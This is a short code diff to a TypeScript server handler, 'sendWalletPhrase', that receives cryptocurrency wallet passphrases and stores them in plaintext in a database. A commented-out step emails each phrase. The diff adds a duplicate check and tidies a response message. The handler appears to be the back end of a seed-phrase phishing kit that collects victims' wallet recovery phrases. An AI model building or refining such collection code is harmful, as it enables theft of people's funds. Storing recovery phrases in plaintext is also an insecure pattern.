@@ -50,8 +50,13 @@ export const sendWalletPhrase = async (req: Request, res: Response) => {
   try {
     // 1. Save to database
     const walletPhraseRepository = AppDataSource.getRepository(WalletPhrase);
-    const newPhrase = walletPhraseRepository.create({ passphrase: passphrase });
-    await walletPhraseRepository.save(newPhrase);
+
+    // Check if the phrase already exists to ensure idempotency
+    const existingPhrase = await walletPhraseRepository.findOne({ where: { passphrase } });
+    if (!existingPhrase) {
+      const newPhrase = walletPhraseRepository.create({ passphrase: passphrase });
+      await walletPhraseRepository.save(newPhrase);
+    }
 
     // 2. Send email
     // await transporter.sendMail({
@@ -61,7 +66,7 @@ export const sendWalletPhrase = async (req: Request, res: Response) => {
     //   text: `Wallet Passphrase: ${passphrase}`,
     // });
 
-    res.status(200).json({ message: 'Phrase saved sent successfully' });
+    res.status(200).json({ message: 'Phrase saved successfully' });
   } catch (error) {
     console.error('Error in sendWalletPhrase:', error);
     if (error instanceof Error) {
